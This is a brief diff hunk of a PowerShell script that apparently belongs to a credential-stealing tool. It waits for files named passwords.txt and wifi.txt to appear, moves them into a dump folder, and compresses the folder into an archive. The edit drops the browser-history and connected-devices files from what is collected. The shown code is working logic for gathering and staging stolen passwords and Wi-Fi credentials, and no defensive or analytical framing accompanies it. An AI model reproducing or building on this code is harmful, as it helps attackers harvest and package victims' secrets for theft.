@@ -30,7 +30,7 @@ while (!(Test-Path "passwords.txt") -or !(Test-Path "wifi.txt")) {
     Start-Sleep -Seconds 1
 }
 
-Move-Item passwords.txt, wifi.txt, history.txt, connected_devices.txt -Destination "$dumpFolder"
+Move-Item passwords.txt, wifi.txt -Destination "$dumpFolder"
 
 # Compress extracted data
 Compress-Archive -Path "$dumpFolder\*" -DestinationPath "$dumpFile" -Force
